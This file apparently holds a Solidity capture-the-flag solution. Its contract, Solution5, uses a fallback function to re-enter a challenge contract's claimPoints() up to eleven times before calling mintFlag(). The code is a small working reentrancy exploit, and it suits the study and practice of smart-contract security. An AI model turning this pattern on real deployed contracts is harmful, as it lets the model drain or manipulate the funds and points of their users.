//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
import {console} from "forge-std/console.sol";

interface IChallenge5 {
    function claimPoints() external;

    function mintFlag() external;
}

contract Solution5 {
    uint256 private c = 0;
    IChallenge5 private challenge5;

    constructor(address _challenge5) {
        challenge5 = IChallenge5(_challenge5);
    }

    function solve() external {
        IChallenge5 cachedChallenge = IChallenge5(challenge5);
        c+= 1;
        cachedChallenge.claimPoints();
        cachedChallenge.mintFlag();
    }

    fallback() external {
        if (c >= 11) {
            return;
        } else {
            c+= 1;
            challenge5.claimPoints();
        }
    }
}
